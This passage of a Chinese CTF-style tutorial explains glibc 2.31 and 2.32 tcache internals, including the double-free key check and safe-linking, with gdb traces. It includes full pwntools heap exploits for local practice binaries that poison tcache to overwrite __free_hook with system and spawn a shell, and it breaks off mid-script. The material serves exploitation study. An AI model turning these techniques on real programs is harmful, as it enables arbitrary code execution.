<p>​    key字段用于检测是否存在double free，在_int_free中有这样一段代码来检测tcache中的double free</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">  &#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">	 tmp;</span><br><span class="line">	 tmp = tmp-&gt;next)</span><br><span class="line">      <span class="keyword">if</span> (tmp == e)</span><br><span class="line">	malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">    <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">       few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>​    这段代码的意思就是如果key值等于tcache的地址，那么就进入tcache的链表，然后后移，判断当前堆块是否在链表中，如果在链表中，那么很显然就是double free了。绕过方法很简单，利用漏洞改掉key值即可，直接给干掉if判断了，就不会进入这个if分支了。</p>
<p>​    在UAF下的利用手法为首先填满tcache，然后申请unsorted bin大小的chunk，利用UAF泄露libc基址，最后通过修改tcache的指针轻松的将堆块申请到__free_hook，修改为system地址，然后free一个chunk，chunk的内容为”/bin/sh\x00”即可轻松getshell。</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>​    泄露libc地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">message = <span class="string">&quot;======================== LEAK HEAP ADDRESS ======================&quot;</span></span><br><span class="line">success(message)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0x80</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x80</span>, <span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x10</span>, <span class="string">&#x27;protected&#x27;</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x40</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">138</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;LIBC:&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">__free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p>​    修改next指针为__free_hook</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">message = <span class="string">&quot;======================== TCACHE ATTACK ========================&quot;</span></span><br><span class="line">success(message)</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">6</span>, p64(__free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x80</span>, <span class="string">&#x27;hacker&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x80</span>, p64(system))</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x10</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>​    完整exp如下仅供参考，由于整个程序在堆块编辑的过程中限制很宽松，大家可以自己写出更多种exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./UAF_glibc2.31&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;./libc-2.31.so&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index, size, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;index&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;size&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;index&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;index&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;index&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">message = <span class="string">&quot;======================== LEAK HEAP ADDRESS ======================&quot;</span></span><br><span class="line">success(message)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0x80</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x80</span>, <span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x10</span>, <span class="string">&#x27;protected&#x27;</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x40</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">138</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;LIBC:&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">__free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">message = <span class="string">&quot;======================== TCACHE ATTACK ======================&quot;</span></span><br><span class="line">success(message)</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">6</span>, p64(__free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x80</span>, <span class="string">&#x27;hacker&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x80</span>, p64(system))</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x10</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>​    最后谈一下libc2.27和libc2.31的一些小tips，当我们攻击tcache_perthread_struct时，很常见的一个做法就是来将其记录counts的区域全部覆盖填满，这样我们再次申请的chunk可逃逸出tcache，在libc2.27中counts[TCACHE_MAX_BINS]的类型为char，即在相应size的位置上记录数量的大小是一个字节，而在libc2.31中相应的类型为uint16_t，大小是两个字节，所以我们之前的payload通常是<code>b&quot;\x07&quot; * 0x40</code>（从trcache_perthread_struct的数据区开始填充），在libc2.31中，payload需要改写成<code>b&quot;\x07&quot; * 0x80</code>，因为大小多了一倍，也相应的需要增加padding。</p>
<p><img src="https://i.loli.net/2021/05/18/bVhP95jX3nJzpQk.png" alt=""></p>
<h2 id="2-32"><a href="#2-32" class="headerlink" title="2.32"></a>2.32</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul>
<li><p>源码下载</p>
<p><a target="_blank" rel="noopener" href="https://ftp.gnu.org/gnu/glibc/">https://ftp.gnu.org/gnu/glibc/</a></p>
</li>
</ul>
<p>下载好源码后新建一个文件夹用于存放源码</p>
<p>新建一个文件夹用于存放编译后的libc</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /glibc/glibc-2.32_src/	       # 源码在这</span><br><span class="line">sudo mkdir build</span><br><span class="line">cd build </span><br><span class="line">CFLAGS=&quot;-g -g3 -ggdb -gdwarf-4 -Og&quot;</span><br><span class="line">CXXFLAGS=&quot;-g -g3 -ggdb -gdwarf-4 -Og&quot;</span><br><span class="line">sudo ../configure --prefix=/glibc/2.32/			# 存放编译后的libc</span><br></pre></td></tr></table></figure>
<p>​    若想调试malloc和free的过程，进入gdb后<code>directory /glibc/glibc-2.32_src/malloc/</code>，其中第二个位置填我们下载的glibc源码路径。</p>
<p>​    记得binary程序需要使用patchelf修改ld加载器和libc</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">patchelf --set-interpreter /glibc/2.32/lib/ld-2.32.so</span><br><span class="line">LD_PRELOAD=/glibc/2.32/lib/libc-2.32.so ./binary</span><br></pre></td></tr></table></figure>
<h3 id="跟踪调试"><a href="#跟踪调试" class="headerlink" title="跟踪调试"></a>跟踪调试</h3><p>​    我们简单写一个malloc和free的demo示例程序，使用gdb来调试malloc和free的过程。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">void</span>* p[<span class="number">20</span>];</span><br><span class="line">	p[<span class="number">0</span>] = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">	p[<span class="number">1</span>] = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">	<span class="built_in">free</span>(p[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">free</span>(p[<span class="number">1</span>]);</span><br><span class="line">	p[<span class="number">2</span>] = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">In file: /home/lemon/Documents/pwn/UAF/2.32/tcache_32.c</span><br><span class="line">    3 int main()</span><br><span class="line">    4 &#123;</span><br><span class="line">    5 	void* p[20];</span><br><span class="line">    6 	p[0] = malloc(0x80);</span><br><span class="line">    7 	p[1] = malloc(0x80);</span><br><span class="line"> ►  8 	free(p[0]);</span><br><span class="line">    9 	free(p[1]);</span><br><span class="line">   10 	p[2] = malloc(0x80);</span><br><span class="line">   11 &#125;</span><br></pre></td></tr></table></figure>
<h4 id="free过程"><a href="#free过程" class="headerlink" title="free过程"></a>free过程</h4><p>​    我们定位到第八行后，按s步入free的过程</p>
<p><img src="https://i.loli.net/2021/05/18/qeVOXbG4sAl7h9j.png" alt=""></p>
<p>​    一直走到_int_free函数，步入此函数</p>
<p><img src="https://i.loli.net/2021/05/18/yLlNk7QcovAWqhJ.png" alt=""></p>
<p>​    向后运行，准备调用tcache_put函数将当前准备free的chunk放入tcache结构体中</p>
<p><img src="https://i.loli.net/2021/05/18/uNDrFyIVwe9odXG.png" alt=""></p>
<p>​    tcache相关的结构体如下，可以发现其实相对于libc-2.31的代码tcache结构体没有发生变化</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure>
<p>​    在libc2.32中，tcache_put函数如下，可以发现相对于libc-2.31的代码，key的值还是赋值为tcache，但是e的next指针发生了变化，不再是下一个tcache的地址，而是引入了一个宏<code>PROTECT_PTR</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    我们找到相应的宏定义</p>
<p><img src="https://i.loli.net/2021/05/18/q9Xp6HOrJyRMIDQ.png" alt=""></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line">  ((__typeof (ptr)) ((((<span class="keyword">size_t</span>) pos) &gt;&gt; <span class="number">12</span>) ^ ((<span class="keyword">size_t</span>) ptr)))</span><br></pre></td></tr></table></figure>
<p>​    </p>
<p>​    这个宏定义就是第一个参数右移12位再和第二个参数做一次异或，也就是说e-&gt;next会指向这个值，我们在gdb中查看，发现确实变为了一个奇怪的值。</p>
<p><img src="https://i.loli.net/2021/05/18/gwuRz9n4ByAaslP.png" alt=""></p>
<p>​    我们可以来验证一下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br></pre></td></tr></table></figure>
<p>​    第一个参数是&amp;e-&gt;next，也就是这一个位置的地址，为0x55555555a2a0，第二个参数是tcache-&gt;entries[tc_idx]，因为当前tcache的链表其实是空的（之前还没有free过chunk），所以第二个参数值为0，我们用宏定义做一个运算，将第一个参数右移12位后异或0，发现得出的值与填入e-&gt;next的值一致。</p>
<p><img src="https://i.loli.net/2021/05/18/Qx1azgpFm2LR3nV.png" alt=""></p>
<p>​    </p>
<p>​    执行完tcache_put函数后就return了。值得关注的是libc2.32的safe-linking机制，就是在e-&gt;next位置不再直白的插入下一块chunk的地址，而是利用了地址随机化技术，将当前地址右移后与tcache链表尾部的地址做了一次异或再插入链表尾部。</p>
<p>​    我们看malloc时发生了什么。</p>
<h4 id="malloc过程"><a href="#malloc过程" class="headerlink" title="malloc过程"></a>malloc过程</h4><p>​    走到这里准备单步进入malloc函数</p>
<p><img src="https://i.loli.net/2021/05/18/rRahfLOAGSXTsWN.png" alt=""></p>
<p>​    准备进入tcache_get函数</p>
<p><img src="https://i.loli.net/2021/05/18/wg7NEJnHoxlrzVR.png" alt=""></p>
<p>​    tcache_get函数源代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    与libc2.31做对比的话，libc2.31是<code>tcache-&gt;entries[tc_idx] = e-&gt;next;</code></p>
<p>​    而libc2.32是<code>tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);</code></p>
<p>​    多了一个宏定义REVEAL_PTR，我们展开后是<code>#define REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</code></p>
<p>​    本质还是调用了PROTECT_PTR这个宏，我们观察参数，这个宏是让ptr的地址右移后和ptr做一次异或，即可恢复出e-&gt;next</p>
<p>​    我们继续向后运行</p>
<p>​    执行那个宏之前tcache_perthread_struct中的链表的值是如图所示的值</p>
<p><img src="https://i.loli.net/2021/05/18/6rRutF2BqP5hywD.png" alt=""></p>
<p>​    执行后发生变化如图所示</p>
<p><img src="https://i.loli.net/2021/05/18/wpVvTKlWOfLrFXH.png" alt=""></p>
<p>​    完整的构成了safe-linking机制。</p>
<h3 id="利用手法-2"><a href="#利用手法-2" class="headerlink" title="利用手法"></a>利用手法</h3><p>​    在UAF的场景下，我们可以直接用show即可泄露出e-&gt;next值，因为最初tcache链表是为空的，也就是说safe-linking机制只相当于用堆地址右移了12位，通过左移即可恢复出堆地址，从而泄露出堆的基址，泄露出堆地址以后就可以来伪造tcache的next位了，我们可以在free态的chunk中修改next为<code>(&amp;next)&gt;&gt;12 &amp; __free_hook</code>（因为我们泄露出堆基址所以可以轻松的获取到&amp;next的值），这样调用完tcache<em>get之后就可以把\</em>_free_hook链入到可供我们申请的链表当中，即可覆写__free_hook来getshell。</p>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><p>​    泄露堆基址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">message = <span class="string">&quot;======================== LEAK HEAP ADDRESS ======================&quot;</span></span><br><span class="line">success(message)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x90</span>, <span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;?\n&quot;</span>)</span><br><span class="line">heap = u64(p.recv(<span class="number">5</span>)[-<span class="number">5</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">heap = heap &lt;&lt; <span class="number">12</span></span><br><span class="line">info(<span class="string">&quot;HEAP BASE ----&gt; &quot;</span> + <span class="built_in">hex</span>(heap))</span><br></pre></td></tr></table></figure>
<p>​    泄露libc基址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">message = <span class="string">&quot;======================== LEAK LIBC ADDRESS ======================&quot;</span></span><br><span class="line">success(message)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0x80</span>, <span class="string">&#x27;dawn it&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x80</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x10</span>, <span class="string">&#x27;protect&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">7</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(</span><br><span class="line">    <span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">193</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">info(<span class="string">&quot;LIBC ----&gt; &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">edit(<span class="number">7</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>​    利用UAF伪造tcache的next值，覆写__free_hook</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">message = <span class="string">&quot;======================== TCACHE ATTACK ======================&quot;</span></span><br><span class="line">success(message)</span><br><span class="line">__free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x20</span>, <span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x20</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(pack(heap + <span class="number">0x730</span>, __free_hook)))</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x20</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x20</span>, p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>​    完整exp如下仅供参考，由于整个程序在堆块编辑的过程中限制很宽松，大家可以自己写出更多种exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">binary = <span class="string">&#x27;./UAF_glibc2.32&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;./libc-2.32.so&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index, size, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;index&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;size&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;index&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;index&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;index&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack</span>(<span class="params">pos, ptr</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (pos &gt;&gt; <span class="number">12</span>) ^ ptr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdbg</span>():</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">message = <span class="string">&quot;======================== LEAK HEAP ADDRESS ======================&quot;</span></span><br><span class="line">success(message)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x90</span>, <span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;?\n&quot;</span>)</span><br><span class="line">heap = u64(p.recv(<span class="number">5</span>)[-<span class="number">5</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">heap = heap &lt;&lt; <span class="number">12</span></span><br><span class="line">info(<span class="string">&quot;HEAP BASE ----&gt; &quot;</span> + <span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line">message = <span class="string">&quot;======================== LEAK LIBC ADDRESS ======================&quot;</span></span><br><span class="line">success(message)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0x80</span>, <span class="string">&#x27;dawn it&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x80</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x10</span>, <span class="string">&#x27;protect&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">7</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(</span><br><span class="line">    <span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">193</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">info(<span class="string">&quot;LIBC ----&gt; &quot;</span> + <span 